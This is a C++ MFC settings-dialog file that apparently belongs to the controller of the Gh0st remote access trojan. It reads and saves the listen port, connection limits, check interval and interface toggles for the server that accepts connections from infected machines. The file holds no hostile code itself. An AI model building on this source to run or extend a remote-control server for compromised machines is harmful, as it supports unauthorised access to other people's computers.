// ConfigDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "ConfigDlg.h"
#include "MainFrm.h"
#include "gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CConfigDlg dialog
extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;

CConfigDlg::CConfigDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CConfigDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CConfigDlg)
	m_listen_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 80);
	m_max_connections = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection", 8000);
	m_bIsDisablePopTips = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
	m_Tray = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Tary", FALSE);
	m_Animate = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Animate", FALSE);
	m_connect_auto = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnectionAuto", 0);
	m_Sound = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", 0);
	m_check_time = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "CheckTime", 30);
	m_Appment = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Announcement", FALSE);
	//}}AFX_DATA_INIT
}


void CConfigDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CConfigDlg)
	DDX_Text(pDX, IDC_LINSTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 65535);
	DDX_Text(pDX, IDC_MAX_CONNECT, m_max_connections);
	DDV_MinMaxUInt(pDX, m_max_connections, 1, 100000);
	DDX_Check(pDX, IDC_CLOSE_TIPS, m_bIsDisablePopTips);
	DDX_Check(pDX, IDC_CLOSE_TOTUOPAN, m_Tray);
	DDX_Check(pDX, IDC_CLOSE_ANIMATE, m_Animate);
	DDX_Check(pDX, IDC_AUTO_CONNECT, m_connect_auto);
	DDX_Check(pDX, IDC_OPEN_SOUND, m_Sound);
	DDX_Text(pDX, IDC_CHECK_TIME, m_check_time);
	DDV_MinMaxUInt(pDX, m_check_time, 20, 600);
	DDX_Check(pDX, IDC_CLOSE_APPMENT, m_Appment);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CConfigDlg, CDialog)
	//{{AFX_MSG_MAP(CConfigDlg)
	ON_BN_CLICKED(IDC_BUTTON_APPLY, OnButtonApply)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CConfigDlg message handlers

void CConfigDlg::OnButtonApply() 
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;
	int prev_Chek_time = m_check_time;

	UpdateData(TRUE);

	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 8000);
		else
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}

	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);

	if(prev_Chek_time != m_check_time)
		CGh0stView::CheckTime=m_check_time;

	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Animate", m_Animate);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Tary", m_Tray);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "PopTips", m_bIsDisablePopTips);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Sound", m_Sound);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "CheckTime", m_check_time);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Announcement", m_Appment);

	((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips = m_bIsDisablePopTips;
	((CGh0stApp *)AfxGetApp())->m_bPalySound = m_Sound;
	
	g_pFrame->CloseAnnouncement();

}

BOOL CConfigDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here	
	if(m_connect_auto)
		GetDlgItem(IDC_MAX_CONNECT)->EnableWindow(FALSE);


	SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_SETING),FALSE);
	SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_SETING),TRUE);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
